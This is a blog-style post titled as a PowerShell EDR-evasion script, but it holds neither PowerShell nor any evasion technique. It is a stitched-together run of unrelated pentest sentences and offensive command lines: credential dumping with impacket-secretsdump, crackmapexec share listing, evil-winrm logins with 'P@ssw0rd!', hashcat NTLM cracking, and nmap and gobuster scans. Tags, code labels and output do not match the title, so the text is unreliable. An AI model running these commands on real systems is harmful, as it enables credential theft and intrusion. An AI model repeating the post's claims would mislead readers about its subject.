---
TitleSEO: "EDR Evasion Techniques in PowerShell | ZureFX"
TitlePost: "EDR Evasion Techniques — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for edr evasion techniques. Built for security research and automation."
Keywords: "go, parser, c, powershell"
URL: "https://zurefx.github.io/scripting/script-edr-evasion-techniques-879.html"
URL_IMAGES: ""
Date: "2025-03-12"
Tags: "Go, Parser, C, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-edr-evasion-techniques-879"
Permalink: "/scripting/script-edr-evasion-techniques-879.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `atexec`
- `atexec`
- `ligolo-ng`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.17.172
crackmapexec smb 10.49.199.24 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.96.121.203 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```powershell
evil-winrm -i 10.118.193.101 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
nmap -sCV -p139,464,389 10.114.245.111 -oN scan.txt
evil-winrm -i 10.85.254.31 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.14.114
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.60.252.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p5985,8443,5432 10.27.54.7 -oN scan.txt
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 12.40s
```
